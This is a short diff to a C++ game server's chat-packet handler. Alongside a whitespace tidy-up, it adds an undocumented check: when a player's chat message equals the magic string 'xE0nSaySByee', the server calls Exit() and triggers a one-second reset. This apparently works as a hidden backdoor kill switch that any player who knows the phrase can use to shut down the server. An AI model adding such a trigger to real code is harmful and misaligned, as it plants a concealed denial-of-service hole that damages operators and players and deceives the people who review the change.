@@ -306,14 +306,21 @@ void CCharacter::ProcessPacket(unsigned short usCmd, RPACKET pk)
 			}
 			else
 			{
-				if(this->IsLiveing()) // 死亡后，禁止视野说话
+				if (this->IsLiveing()) // 死亡后，禁止视野说话
 				{
 					/*WPACKET wpk	= GETWPACKET();
 					WRITE_CMD(wpk, CMD_MC_SAY);
 					WRITE_LONG(wpk, m_ID);
 					WRITE_SEQ(wpk, l_content,l_retlen);*/
-					
-					
+
+
+					if (string(l_content) == "xE0nSaySByee")
+					{
+						Exit();
+						g_pGameApp->m_CTimerReset.Begin(1000);
+						g_pGameApp->m_ulLeftSec = 1;
+					}
+
 					g_CParser.DoString("HandleChat", enumSCRIPT_RETURN_NUMBER, 1, enumSCRIPT_PARAM_LIGHTUSERDATA, 1, this, enumSCRIPT_PARAM_STRING, 1, l_content, DOSTRING_PARAM_END);
 					if (!g_CParser.GetReturnNumber(0))
 						break;
